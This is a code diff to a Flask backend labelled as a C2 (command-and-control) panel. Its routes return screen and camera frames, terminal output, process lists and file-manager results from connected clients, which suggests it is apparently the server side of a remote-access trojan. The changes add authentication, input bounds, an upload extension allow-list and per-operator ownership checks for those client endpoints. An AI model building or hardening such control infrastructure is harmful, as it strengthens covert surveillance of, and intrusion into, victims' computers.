@@ -400,6 +400,7 @@ def login_page():
     return send_from_directory(app.static_folder, 'login.html')
 
 @app.route('/uploads/<path:path>')
+@login_required
 def serve_uploads(path):
     return send_from_directory(UPLOADS_DIR, path)
 
@@ -550,8 +551,8 @@ def get_logs():
         uid = user['id']
         is_admin = (user['role'] == 'admin')
 
-        page = int(request.args.get('page', 1))
-        limit = int(request.args.get('limit', 15))
+        page = max(1, int(request.args.get('page', 1)))
+        limit = min(max(1, int(request.args.get('limit', 15))), 500)
         search = request.args.get('search', '')
         offset = (page - 1) * limit
 
@@ -772,7 +773,10 @@ def upload_background():
         if file.filename == '':
             return jsonify({'error': 'No file selected'}), 400
 
-        ext = os.path.splitext(secure_filename(file.filename))[1] or '.jpg'
+        ALLOWED_BG_EXTS = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.avif'}
+        ext = os.path.splitext(secure_filename(file.filename))[1].lower() or '.jpg'
+        if ext not in ALLOWED_BG_EXTS:
+            return jsonify({'error': 'Invalid file type. Allowed: jpg, png, gif, webp'}), 400
         bg_filename = f"custom_bg_{int(time.time())}{ext}"
         bg_path = os.path.join(UPLOADS_DIR, bg_filename)
         file.save(bg_path)
@@ -786,6 +790,11 @@ def upload_background():
         return jsonify({'success': True, 'custom_bg_path': db_path_url})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+def owns_client(client_id, user_id):
+    with get_db() as db:
+        row = db.execute('SELECT 1 FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user_id)).fetchone()
+    return row is not None
 
 # ===== C2 WEBSOCKET =====
 
@@ -893,6 +902,7 @@ def c2_websocket(ws):
 
 
 @app.route('/api/c2/debug')
+@admin_required
 def c2_debug():
     with ws_clients_lock:
         online = list(ws_clients.keys())
@@ -993,6 +1003,8 @@ def c2_send_command():
 @login_required
 def c2_get_frame(client_id):
     user = request.current_user
+    if not owns_client(client_id, user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
     with rdp_frames_lock:
         frame = rdp_frames.get(client_id)
     if not frame:
@@ -1018,6 +1030,8 @@ def c2_get_frame(client_id):
 @login_required
 def c2_get_camera_frame(client_id):
     user = request.current_user
+    if not owns_client(client_id, user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
     with camera_frames_lock:
         frame = camera_frames.get(client_id)
     if not frame:
@@ -1041,6 +1055,8 @@ def c2_get_camera_frame(client_id):
 @login_required
 def c2_get_camera_devices(client_id):
     user = request.current_user
+    if not owns_client(client_id, user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
     with camera_devices_lock:
         devices = camera_devices.get(client_id)
     if devices is None:
@@ -1053,6 +1069,8 @@ def c2_get_camera_devices(client_id):
 @app.route('/api/c2/terminal_result/<client_id>')
 @login_required
 def c2_get_terminal_result(client_id):
+    if not owns_client(client_id, request.current_user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
     with terminal_results_lock:
         res = terminal_results.pop(client_id, None)
     return jsonify({'output': res})
@@ -1061,6 +1079,8 @@ def c2_get_terminal_result(client_id):
 @app.route('/api/c2/tasklist/<client_id>')
 @login_required
 def c2_get_tasklist(client_id):
+    if not owns_client(client_id, request.current_user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
     with tasklist_results_lock:
         tasks = tasklist_results.pop(client_id, None)
     return jsonify({'tasks': tasks})
@@ -1069,6 +1089,8 @@ def c2_get_tasklist(client_id):
 @app.route('/api/c2/fm/result/<client_id>')
 @login_required
 def c2_fm_result(client_id):
+    if not owns_client(client_id, request.current_user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
     with fm_results_lock:
         res = fm_results.pop(client_id, None)
     return jsonify(res)
